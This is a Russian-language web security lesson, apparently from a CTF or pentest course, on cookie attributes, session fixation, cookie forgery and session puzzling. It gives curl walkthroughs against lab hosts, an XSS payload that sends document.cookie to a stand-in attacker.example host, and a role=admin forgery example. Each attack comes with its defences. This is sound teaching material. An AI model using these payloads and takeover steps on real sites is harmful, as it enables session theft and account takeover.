HTTP — протокол без состояния: сервер не помнит, что вы уже залогинились. Чтобы «помнить» пользователя, придумали **cookie** и **сессии**. Почти каждая авторизационная уязвимость (IDOR, CSRF, кража аккаунта) начинается именно с cookie. В этом уроке вы научитесь читать атрибуты cookie, понимать, где живёт сессия, и находить две классические ошибки — отсутствие флагов и фиксацию сессии.

## Теория: cookie vs серверная сессия

**Cookie** — это небольшая пара `имя=значение`, которую сервер отправляет заголовком `Set-Cookie`, а браузер шлёт обратно в каждом запросе заголовком `Cookie`.

```
Set-Cookie: sessionid=9f2c8a1b; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
```

Разберём атрибуты — это и есть чек-лист безопасности:

| Атрибут | Смысл | Опасность при отсутствии |
|---------|-------|--------------------------|
| `HttpOnly` | JS не может прочитать cookie (`document.cookie`) | XSS сразу крадёт сессию |
| `Secure` | cookie шлётся только по HTTPS | кража по HTTP (MITM, downgrade) |
| `SameSite` | не отправлять cookie в кросс-сайтовых запросах | CSRF-запросы проходят |
| `Domain` | для каких доменов шлётся | слишком широкий домен → cookie утекает на поддомен |
| `Path` | для каких путей | слишком широкий путь → лишняя экспозиция |
| `Expires/Max-Age` | время жизни | «вечная» сессия = нет ротации |

Есть две модели состояния:

1. **Серверная сессия.** Cookie содержит только непредсказуемый `sessionid` (128+ бит случайности). Сами данные лежат на сервере (память, Redis, БД). Безопаснее: клиент не может подделать содержимое.
2. **Клиентская сессия.** В cookie лежит подписанный/зашифрованный токен (Flask `session`, JWT). Данные у клиента, сервер их только проверяет. Опасность — слабая подпись, слабый секрет, alg confusion (см. `web-auth-jwt-idor`).

Ключевая мысль: **идентификатор сессии — это и есть пароль**. Кто знает ваш `sessionid`, тот вы.

## Теория: что такое фиксация сессии (Session Fixation)

Нормальный флоу: до логина у вас анонимная сессия → после логина сервер **выдаёт новый** `sessionid`. Ошибка — если сервер **не меняет** идентификатор после аутентификации.

Атака:
1. Атакующий получает на сайте валидный анонимный `sessionid=S` (просто заходит на сайт).
2. Навязывает этот id жертве (через URL `?sessionid=S`, ссылку, XSS, cookie-injection с поддомена).
3. Жертва логинится, но сервер оставляет тот же `S`.
4. Атакующий использует `S` — и он уже аутентифицирован как жертва.

Похожий класс — **session prediction**: если id генерируется предсказуемо (последовательный счётчик, `md5(username)`, слабый PRNG), его можно угадать. И **session puzzling**: одна и та же переменная сессии используется для разных целей.

## Инструменты: чтение и подмена cookie

Посмотреть все cookie, которые ставит сайт, и их атрибуты:

```bash
curl -s -I https://target.local/ | grep -i '^set-cookie'
```

Сохранить cookie в jar и посмотреть файл:

```bash
curl -s -c jar.txt https://target.local/login -d 'u=a&p=b' >/dev/null
cat jar.txt
```

Проверить флаг `HttpOnly` глазами в браузере: DevTools → Application → Cookies, колонка HttpOnly.

Массовая проверка атрибутов по списку URL:

```bash
while read u; do
  curl -s -I "$u" | grep -i '^set-cookie' | sed "s|^|$u |"
done < urls.txt | grep -viE 'httponly.*secure.*samesite'
```

В **Burp** правый клик по запросу → *Send to Repeater*, а вкладка *Cookie jar* / расширение **Cookie Editor** позволяет менять значения и флаги на лету.

## Разобранный пример: фиксация сессии

Цель: `http://lab.local/`.

Шаг 1. Получаем анонимную сессию и запоминаем id:

```bash
curl -s -i -c anon.txt http://lab.local/ | grep -i '^set-cookie'
# Set-Cookie: SID=AAA111; Path=/
```

Шаг 2. Проверяем, принимает ли сервер id из URL (классический фикс-вектор):

```bash
curl -s -i -b 'SID=AAA111' -X POST http://lab.local/login \
  -d 'username=victim&password=correct' | grep -i '^set-cookie'
# Set-Cookie: SID=AAA111; Path=/   <-- id НЕ изменился => уязвимо
```

Шаг 3. Теперь атакующий (мы) с тем же `SID=AAA111`:

```bash
curl -s -b 'SID=AAA111' http://lab.local/account
# <h1>Welcome, victim</h1>   <-- мы внутри аккаунта жертвы
```

Если бы сервер после логина выдал новый `SID`, шаг 3 вернул бы форму логина. Так подтверждается фиксация.

## Разобранный пример: кража через отсутствующий HttpOnly + XSS

Если `HttpOnly` не выставлен, а на странице есть XSS (см. `web-xss`), достаточно:

```html
<script>fetch('https://attacker.example/?c='+document.cookie)</script>
```

Сервер атакующего в логе видит `SID=...` и переиспользует его. Именно поэтому `HttpOnly` + `Secure` + `SameSite=Lax/Strict` — обязательный минимум.

## Частые ошибки

- **Считать, что HttpOnly спасает от всего.** HttpOnly защищает от чтения через JS, но не от CSRF и не от использования cookie самим браузером.
- **Путать SameSite и CSRF-токен.** `SameSite=Lax` смягчает, но не заменяет токен: для GET-переходов cookie всё равно уходит.
- **Игнорировать анонимную cookie.** Часто именно до логина выдаётся id, который потом «закрепляется». Всегда сравнивайте `Set-Cookie` до и после логина.
- **Доверять `Domain=.example.com`.** Cookie становится доступна всем поддоменам; скомпрометированный поддомен (или subdomain takeover, см. `web-subdomain-takeover`) крадёт сессию основного сайта.
- **Не проверять ротацию после смены пароля/привилегий.** Если id не меняется — возможен захват сессии.
- **Забывать про `X-Forwarded-Host`/`Host`.** Некоторые фреймворки строят `Set-Cookie` из Host — см. `web-host-header`.

## Флаги cookie: полный справочник

Понимание флагов cookie — основа аудита сессий. Каждый флаг закрывает свой класс атак.

| Флаг | Смысл | Что защищает |
|------|-------|--------------|
| `HttpOnly` | недоступна JS | кража через XSS |
| `Secure` | только по HTTPS | перехват по сети |
| `SameSite=Strict` | не отправляется cross-site | CSRF |
| `SameSite=Lax` | отправляется при top-level GET | частично CSRF |
| `SameSite=None` | отправляется всегда | ничего (нужен `Secure`) |
| `Path` | область действия | сужение доступа |
| `Domain` | домен и поддомены | расширение доступа (риск!) |
| `Max-Age`/`Expires` | срок жизни | persistence |
| `__Host-` префикс | требует Secure, Path=/, без Domain | защита от подмены |

Опасные комбинации: отсутствие `HttpOnly` (кража через XSS), отсутствие `Secure` (перехват), `SameSite=None` без причины (CSRF), широкий `Domain` (поддомен с XSS читает cookie). Проверяйте все.

```bash
curl -sI https://t/ | grep -i set-cookie
# Set-Cookie: sid=...; Path=/; HttpOnly; Secure; SameSite=Strict
```

## Атаки на cookie: кража, подмена, фиксация

Три основных класса. **Кража** — через XSS (если нет `HttpOnly`), через сеть (если нет `Secure`), через поддомен (если широкий `Domain`). **Подмена** — если cookie не подписана, можно изменить её значение (`role=admin`). **Фиксация** — если сервер не меняет ID при логине, атакующий навязывает известный ID и после входа получает доступ.

```bash
# подмена (если cookie — это роль без подписи)
curl -s https://t/admin -b 'role=admin'
# фиксация: навязать sid, затем жертва логинится
curl -s -c jar https://t/ ; grep -i sid jar
# -> отдаём этот sid жертве (через URL/мета), после логина он валиден для нас
```

## Что делать дальше / решение

Для каждого cookie выпишите флаги и оцените, какой класс атак он оставляет открытым. Проверьте смену ID при логине (фиксация), подписанность значения (подмена), доступность из JS (кража). Доводите до артефакта: чужой аккаунт (фиксация), админ-доступ (подмена), утечка сессии (кража). И помните: cookie — граница доверия, и её настройки определяют устойчивость всей аутентификации.

## Разобранный пример: фиксация → захват аккаунта

Разберём полную атаку фиксации сессии. Условие: приложение не меняет идентификатор сессии при логине. Атакующий навязывает жертве известный ему `sid`, жертва логинится, и сессия «поднимается» до аутентифицированной — атакующий уже знает `sid`.

```bash
# 1. атакующий получает валидный sid (анонимный)
$ curl -s -c jar https://t/
$ SID=$(grep -i sess jar | awk '{print $7}')
echo $SID
AAAA1111BBBB2222

# 2. навязывает жертве: через ссылку с ?sid=, через поддомен (cookie injection),
#    через XSS (document.cookie = 'sid=...')
#    пример ссылки: https://t/?sid=AAAA1111BBBB2222

# 3. жертва логинится, приложение НЕ меняет sid
# 4. атакующий использует тот же sid
$ curl -s -b "sess=$SID" https://t/me | grep -i email
victim@corp.local        # захват подтверждён
```

Защита — регенерация ID при логине (`session_regenerate_id` в PHP, `session().cycle()` в Rails, аналоги в других фреймворках). Проверяйте: до и после логина `Set-Cookie` должен менять значение.

```bash
# проверка: меняется ли sid при логине
$ curl -s -c j1 -X POST https://t/login -d 'u=me&p=pw' ; grep sess j1
sess=NEW1234
# если NEW1234 != старый -> регенерация есть
```

## Session puzzling рядом

Если фиксация — про навязанный ID, то **session puzzling** — про переиспользование данных внутри сессии разными флоу. Пример: сессия хранит `pending_email` при регистрации и `reset_token` при сбросе; если ключи пересекаются или порядок не контролируется, можно протащить значение из одного флоу в другой.

```bash
# начинаем регистрацию, затем используем сессию в сбросе
curl -s -c jar -X POST https://t/register/step1 -d 'email=attacker@x'
curl -s -b jar -X POST https://t/forgot -d 'email=victim@x'
# если данные «смешались» -> puzzling
```

## Что делать дальше / решение

Проверяйте: (1) меняется ли ID сессии при логине — если нет, фиксация; (2) очищаются ли cookie при logout; (3) подписано ли значение cookie — если нет, подмена; (4) есть ли `HttpOnly`/`Secure`/`SameSite`. Доводите фиксацию до артефакта (чужой аккаунт), подмену — до админ-доступа, кражу — до утечки сессии. И помните: сессия — центр доверия, и её настройки определяют устойчивость всей аутентификации.

## Где пригодится

- **CTF (Web):** почти в каждой задаче на auth вы подбираете/подделываете cookie; фиксация и предсказуемые id — частые «изюминки».
- **Bug bounty:** отсутствие `HttpOnly`/`Secure`/`SameSite`, слабая ротация сессии — валидные находки с понятным impact.
- **Пентест:** анализ атрибутов cookie и поведения сессии — обязательный пункт чек-листа аутентификации.
- **Работа (AppSec/Dev):** настройка сессий и cookie — базовая гигиена, которую вы будете ревьюить в каждом проекте.
